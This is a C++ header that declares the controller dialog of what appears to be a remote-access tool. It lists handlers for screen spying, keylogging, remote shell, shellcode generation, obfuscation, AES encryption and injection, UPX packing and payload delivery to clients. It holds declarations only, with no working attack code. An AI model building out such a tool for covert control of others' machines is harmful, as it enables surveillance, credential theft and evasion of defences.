// 2015RemoteDlg.h : 头文件
//

#pragma once
#include "afxcmn.h"
#include "TrueColorToolBar.h"
#include "IOCPServer.h"
#include <common/location.h>
#include <map>

//////////////////////////////////////////////////////////////////////////
// 以下为特殊需求使用

// 是否在退出主控端时也退出客户端
#define CLIENT_EXIT_WITH_SERVER 0

// 是否使用同步事件处理消息
#define USING_EVENT 1

typedef struct DllInfo {
    std::string Name;
    Buffer* Data;
    ~DllInfo()
    {
        SAFE_DELETE(Data);
    }
} DllInfo;

typedef struct FileTransformCmd {
    CLock Lock;
    std::map<std::string, uint64_t> CmdTime;
    void PutCmd(const std::string& str)
    {
        Lock.Lock();
        CmdTime[str] = time(0);
        Lock.Unlock();
    }
    bool PopCmd(const std::string& str, int timeoutSec = 10)
    {
        Lock.Lock();
        bool valid = CmdTime.find(str) != CmdTime.end() && time(0) - CmdTime[str] < timeoutSec;
        CmdTime.erase(str);
        Lock.Unlock();
        return valid;
    }
} FileTransformCmd;

#define ID_DYNAMIC_MENU_BASE 36500

//////////////////////////////////////////////////////////////////////////
#include <unordered_map>
#include <fstream>
#include "CGridDialog.h"
#include <set>

enum {
    MAP_NOTE,
    MAP_LOCATION,
    MAP_LEVEL,
};

struct _ClientValue {
    char Note[64];
    char Location[64];
    char Level;
    char Reserved[127]; // 预留
    _ClientValue()
    {
        memset(this, 0, sizeof(_ClientValue));
    }
    _ClientValue(const CString& loc, const CString& s)
    {
        memset(this, 0, sizeof(_ClientValue));
        strcpy_s(Note, s.GetString());
        strcpy_s(Location, loc.GetString());
    }
    void UpdateNote(const CString& s)
    {
        strcpy_s(Note, s.GetString());
    }
    void UpdateLocation(const CString& loc)
    {
        strcpy_s(Location, loc.GetString());
    }
    void UpdateLevel(int level)
    {
        Level = level;
    }
    const char* GetNote() const
    {
        return Note;
    }
    const char* GetLocation() const
    {
        return Location;
    }
    int GetLevel() const
    {
        return Level;
    }
    int GetLength() const
    {
        return sizeof(_ClientValue);
    }
};

typedef uint64_t ClientKey;

typedef _ClientValue ClientValue;

typedef  std::unordered_map<ClientKey, ClientValue> ComputerNoteMap;

// 保存 unordered_map 到文件
void SaveToFile(const ComputerNoteMap& data, const std::string& filename);

// 从文件读取 unordered_map 数据
void LoadFromFile(ComputerNoteMap& data, const std::string& filename);

//////////////////////////////////////////////////////////////////////////

enum {
    PAYLOAD_DLL_X86 = 0,			// 32位 DLL
    PAYLOAD_DLL_X64 = 1,			// 64位 DLL
    PAYLOAD_MAXTYPE
};

class CSplashDlg;  // 前向声明

#include "pwd_gen.h"

// CMy2015RemoteDlg 对话框
class CMy2015RemoteDlg : public CDialogEx
{
public:
    static std::string GetHardwareID(int v=-1);
protected:
    ComputerNoteMap m_ClientMap;
    CString GetClientMapData(ClientKey key, int typ)
    {
        EnterCriticalSection(&m_cs);
        auto f = m_ClientMap.find(key);
        CString r;
        if (f != m_ClientMap.end()) {
            switch (typ) {
            case MAP_NOTE:
                r = f->second.GetNote();
                break;
            case MAP_LOCATION:
                r = f->second.GetLocation();
                break;
            default:
                break;
            }
        }
        LeaveCriticalSection(&m_cs);
        return r;
    }
    void SetClientMapData(ClientKey key, int typ, const char* value)
    {
        EnterCriticalSection(&m_cs);
        switch (typ) {
        case MAP_NOTE:
            m_ClientMap[key].UpdateNote(value);
            break;
        case MAP_LOCATION:
            m_ClientMap[key].UpdateLocation(value);
            break;
        default:
            break;
        }
        LeaveCriticalSection(&m_cs);
    }
    // 构造
public:
    CMy2015RemoteDlg(CWnd* pParent = NULL);	// 标准构造函数
    ~CMy2015RemoteDlg();
    // 对话框数据
    enum { IDD = IDD_MY2015REMOTE_DIALOG };
protected:
    virtual void DoDataExchange(CDataExchange* pDX);	// DDX/DDV 支持
    // 实现
protected:
    HICON m_hIcon;
    void* m_tinyDLL;
    std::string m_superPass;
    BOOL m_needNotify = FALSE;
    DWORD g_StartTick;
    BOOL m_bHookWIN = TRUE;
    BOOL m_runNormal = FALSE;
    // 生成的消息映射函数
    virtual BOOL OnInitDialog();
    afx_msg void OnSysCommand(UINT nID, LPARAM lParam);
    afx_msg void OnPaint();
    afx_msg HCURSOR OnQueryDragIcon();
    DECLARE_MESSAGE_MAP()
public:
    void SortByColumn(int nColumn);
    afx_msg VOID OnHdnItemclickList(NMHDR* pNMHDR, LRESULT* pResult);
    static int CALLBACK CompareFunction(LPARAM lParam1, LPARAM lParam2, LPARAM lParamSort);
    template<class T, int id, int Show = SW_SHOW> LRESULT OpenDialog(WPARAM wParam, LPARAM lParam)
    {
        CONTEXT_OBJECT* ContextObject = (CONTEXT_OBJECT*)lParam;
        T* Dlg = new T(this, ContextObject->GetServer(), ContextObject);
        BOOL isGrid = id == IDD_DIALOG_SCREEN_SPY;
        BOOL ok = (isGrid&&m_gridDlg) ? m_gridDlg->HasSlot() : FALSE;
        Dlg->Create(id, ok ? m_gridDlg : GetDesktopWindow());
        Dlg->ShowWindow(Show);
        if (ok) {
            m_gridDlg->AddChild((CDialog*)Dlg);
            LONG style = ::GetWindowLong(Dlg->GetSafeHwnd(), GWL_STYLE);
            style &= ~(WS_CAPTION | WS_SIZEBOX);  // 去掉标题栏和调整大小
            ::SetWindowLong(Dlg->GetSafeHwnd(), GWL_STYLE, style);
            ::SetWindowPos(Dlg->GetSafeHwnd(), nullptr, 0, 0, 0, 0,
                           SWP_NOMOVE | SWP_NOSIZE | SWP_NOZORDER | SWP_FRAMECHANGED);
            m_gridDlg->ShowWindow(isGrid ? SW_SHOWMAXIMIZED : SW_HIDE);
        }

        ContextObject->hDlg = Dlg;
        if (id == IDD_DIALOG_SCREEN_SPY) {
            EnterCriticalSection(&m_cs);
            m_RemoteWnds[Dlg->GetSafeHwnd()] = (CDialogBase*)Dlg;
            LeaveCriticalSection(&m_cs);
        }

        return 0;
    }
    VOID InitControl();             //初始控件
    VOID TestOnline();              //测试函数
    VOID AddList(CString strIP, CString strAddr, CString strPCName, CString strOS, CString strCPU, CString strVideo, CString strPing,
                 CString ver, CString startTime, std::vector<std::string>& v, CONTEXT_OBJECT* ContextObject);
    VOID ShowMessage(CString strType, CString strMsg);
    VOID CreatStatusBar();
    VOID CreateToolBar();
    VOID CreateNotifyBar();
    VOID CreateSolidMenu();
    int m_nMaxConnection;
    BOOL Activate(const std::string& nPort, int nMaxConnection, const std::string& method);
    void UpdateActiveWindow(CONTEXT_OBJECT* ctx);
    void SendMasterSettings(CONTEXT_OBJECT* ctx);
    BOOL SendServerDll(CONTEXT_OBJECT* ContextObject, bool isDLL, bool is64Bit);
    Buffer* m_ServerDLL[PAYLOAD_MAXTYPE];
    Buffer* m_ServerBin[PAYLOAD_MAXTYPE];
    MasterSettings m_settings;
    static BOOL CALLBACK NotifyProc(CONTEXT_OBJECT* ContextObject);
    static BOOL CALLBACK OfflineProc(CONTEXT_OBJECT* ContextObject);
    BOOL AuthorizeClient(const std::string& sn, const std::string& passcode, uint64_t hmac);
    VOID MessageHandle(CONTEXT_OBJECT* ContextObject);
    VOID SendSelectedCommand(PBYTE  szBuffer, ULONG ulLength);
    VOID SendAllCommand(PBYTE  szBuffer, ULONG ulLength);
    // 显示用户上线信息
    CWnd* m_pFloatingTip = nullptr;
    CListCtrl  m_CList_Online;
    CListCtrl  m_CList_Message;
    std::set<context*> m_HostList;
    std::set<std::string> m_GroupList;
    std::string m_selectedGroup;
    void LoadListData(const std::string& group);
    void DeletePopupWindow(BOOL bForce = FALSE);
    context* FindHost(context* ctx);
    context* FindHost(int port);
    context* FindHost(uint64_t port);

    CStatusBar m_StatusBar;          //状态条
    CTrueColorToolBar m_ToolBar;
    CGridDialog * m_gridDlg = NULL;
    std::vector<DllInfo*> m_DllList;
    context* FindHostByIP(const std::string& ip);
    void InjectTinyRunDll(const std::string& ip, int pid);
    NOTIFYICONDATA  m_Nid;
    HANDLE m_hExit;
    CRITICAL_SECTION m_cs;
    BOOL       isClosed;
    CMenu	   m_MainMenu;
    CBitmap m_bmOnline[20];
    uint64_t m_superID;
    std::map<HWND, CDialogBase *> m_RemoteWnds;
    FileTransformCmd m_CmdList;
    CDialogBase* GetRemoteWindow(HWND hWnd);
    CDialogBase* GetRemoteWindow(CDialogBase* dlg);
    void RemoveRemoteWindow(HWND wnd);
    CDialogBase* m_pActiveSession = nullptr; // 当前活动会话窗口指针 / NULL 表示无
    void UpdateActiveRemoteSession(CDialogBase* sess);
    CDialogBase* GetActiveRemoteSession();
    afx_msg LRESULT OnSessionActivatedMsg(WPARAM wParam, LPARAM lParam);
    static LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);
    HHOOK g_hKeyboardHook = NULL;
    enum {
        STATUS_UNKNOWN = -1,
        STATUS_RUN = 0,
        STATUS_STOP = 1,
        STATUS_EXIT = 2,
    };
    HANDLE m_hFRPThread = NULL;
    int m_frpStatus = STATUS_UNKNOWN;
    static DWORD WINAPI StartFrpClient(LPVOID param);
    void ApplyFrpSettings();
    bool CheckValid(int trail = 14);
    afx_msg void OnTimer(UINT_PTR nIDEvent);
    afx_msg void OnClose();
    void Release();
    afx_msg void OnSize(UINT nType, int cx, int cy);
    afx_msg void OnNMRClickOnline(NMHDR *pNMHDR, LRESULT *pResult);
    afx_msg void OnOnlineMessage();
    afx_msg void OnOnlineDelete();
    afx_msg void OnOnlineUpdate();
    afx_msg void OnAbout();
    afx_msg void OnIconNotify(WPARAM wParam,LPARAM lParam);
    afx_msg void OnNotifyShow();
    afx_msg void OnNotifyExit();
    afx_msg void OnMainSet();
    afx_msg void OnMainExit();
    afx_msg void OnOnlineCmdManager();
    afx_msg void OnOnlineProcessManager();
    afx_msg void OnOnlineWindowManager();
    afx_msg void OnOnlineDesktopManager();
    afx_msg void OnOnlineAudioManager();
    afx_msg void OnOnlineVideoManager();
    afx_msg void OnOnlineFileManager();
    afx_msg void OnOnlineServerManager();
    afx_msg void OnOnlineRegisterManager();
    afx_msg VOID OnOnlineKeyboardManager();
    afx_msg void OnOnlineBuildClient();
    afx_msg LRESULT OnUserToOnlineList(WPARAM wParam, LPARAM lParam);
    afx_msg LRESULT OnUserOfflineMsg(WPARAM wParam, LPARAM lParam);
    afx_msg LRESULT OnOpenScreenSpyDialog(WPARAM wParam, LPARAM lParam);
    afx_msg LRESULT OnOpenFileManagerDialog(WPARAM wParam,LPARAM lParam);
    afx_msg LRESULT OnOpenTalkDialog(WPARAM wPrarm,LPARAM lParam);
    afx_msg LRESULT OnOpenShellDialog(WPARAM wParam,LPARAM lParam);
    afx_msg LRESULT OnOpenSystemDialog(WPARAM wParam,LPARAM lParam);
    afx_msg LRESULT OnOpenAudioDialog(WPARAM wParam,LPARAM lParam);
    afx_msg LRESULT OnOpenRegisterDialog(WPARAM wParam, LPARAM lParam);
    afx_msg LRESULT OnOpenServicesDialog(WPARAM wParam, LPARAM lParam);
    afx_msg LRESULT OnOpenVideoDialog(WPARAM wParam, LPARAM lParam);
    afx_msg LRESULT OnHandleMessage(WPARAM wParam, LPARAM lParam);
    afx_msg LRESULT OnOpenKeyboardDialog(WPARAM wParam, LPARAM lParam);
    afx_msg LRESULT OnOpenHideScreenDialog(WPARAM wParam, LPARAM lParam);
    afx_msg LRESULT OnOpenMachineManagerDialog(WPARAM wParam, LPARAM lParam);
    afx_msg LRESULT OnOpenProxyDialog(WPARAM wParam, LPARAM lParam);
    afx_msg LRESULT OnOpenChatDialog(WPARAM wParam, LPARAM lParam);
    afx_msg LRESULT OnOpenDecryptDialog(WPARAM wParam, LPARAM lParam);
    afx_msg LRESULT OnOpenFileMgrDialog(WPARAM wParam, LPARAM lParam);
    afx_msg LRESULT OnOpenDrawingBoard(WPARAM wParam, LPARAM lParam);
    afx_msg LRESULT UPXProcResult(WPARAM wParam, LPARAM lParam);
    afx_msg LRESULT InjectShellcode(WPARAM wParam, LPARAM lParam);
    afx_msg LRESULT AntiBlackScreen(WPARAM wParam, LPARAM lParam);
    afx_msg LRESULT ShareClient(WPARAM wParam, LPARAM lParam);
    LRESULT assignFunction(WPARAM wParam, LPARAM lParam, BOOL all);
    afx_msg LRESULT AssignClient(WPARAM wParam, LPARAM lParam);
    afx_msg LRESULT AssignAllClient(WPARAM wParam, LPARAM lParam);
    afx_msg LRESULT UpdateUserEvent(WPARAM wParam, LPARAM lParam);
    afx_msg BOOL OnHelpInfo(HELPINFO* pHelpInfo);
    virtual BOOL PreTranslateMessage(MSG* pMsg);
    int m_TraceTime = 1000;
    virtual LRESULT WindowProc(UINT message, WPARAM wParam, LPARAM lParam);
    afx_msg void OnOnlineShare();
    afx_msg void OnToolAuth();
    afx_msg void OnToolGenMaster();
    afx_msg void OnMainProxy();
    afx_msg void OnOnlineHostnote();
    afx_msg void OnHelpImportant();
    afx_msg void OnHelpFeedback();
    afx_msg void OnDynamicSubMenu(UINT nID);
    afx_msg void OnOnlineVirtualDesktop();
    afx_msg void OnOnlineGrayDesktop();
    afx_msg void OnOnlineRemoteDesktop();
    afx_msg void OnOnlineH264Desktop();
    afx_msg void OnWhatIsThis();
    afx_msg void OnOnlineAuthorize();
    void OnListClick(NMHDR* pNMHDR, LRESULT* pResult);
    afx_msg void OnOnlineUnauthorize();
    afx_msg void OnToolRequestAuth();
    afx_msg LRESULT OnPasswordCheck(WPARAM wParam, LPARAM lParam);
    afx_msg void OnToolInputPassword();
    afx_msg LRESULT OnShowNotify(WPARAM wParam, LPARAM lParam);
    afx_msg LRESULT OnShowMessage(WPARAM wParam, LPARAM lParam);
    afx_msg void OnToolGenShellcode();
    afx_msg void OnOnlineAssignTo();
    afx_msg void OnNMCustomdrawMessage(NMHDR* pNMHDR, LRESULT* pResult);
    afx_msg void OnOnlineAddWatch();
    afx_msg void OnNMCustomdrawOnline(NMHDR* pNMHDR, LRESULT* pResult);
    afx_msg void OnOnlineRunAsAdmin();
    afx_msg LRESULT OnShowErrMessage(WPARAM wParam, LPARAM lParam);
    afx_msg void OnMainWallet();
    afx_msg void OnToolRcedit();
    afx_msg void OnOnlineUninstall();
    afx_msg void OnOnlinePrivateScreen();
    CTabCtrl m_GroupTab;
    afx_msg void OnSelchangeGroupTab(NMHDR* pNMHDR, LRESULT* pResult);
    afx_msg void OnObfsShellcode();
    afx_msg void OnOnlineRegroup();
    afx_msg void OnMachineShutdown();
    afx_msg void OnMachineReboot();
    afx_msg void OnExecuteDownload();
    afx_msg void OnExecuteUpload();
    afx_msg void OnMachineLogout();
    void MachineManage(MachineCommand type);
    afx_msg void OnDestroy();
    afx_msg void OnToolGenShellcodeBin();
    afx_msg void OnShellcodeLoadTest();
    afx_msg void OnShellcodeObfsLoadTest();
    afx_msg void OnObfsShellcodeBin();
    afx_msg void OnShellcodeAesBin();
    afx_msg void OnShellcodeTestAesBin();
    afx_msg void OnToolReloadPlugins();
    afx_msg void OnShellcodeAesCArray();
    afx_msg void OnParamKblogger();
    afx_msg void OnOnlineInjNotepad();
    afx_msg void OnParamLoginNotify();
    afx_msg void OnParamEnableLog();
    afx_msg void OnProxyPort();
    afx_msg void OnHookWin();
    afx_msg void OnRunasService();
};
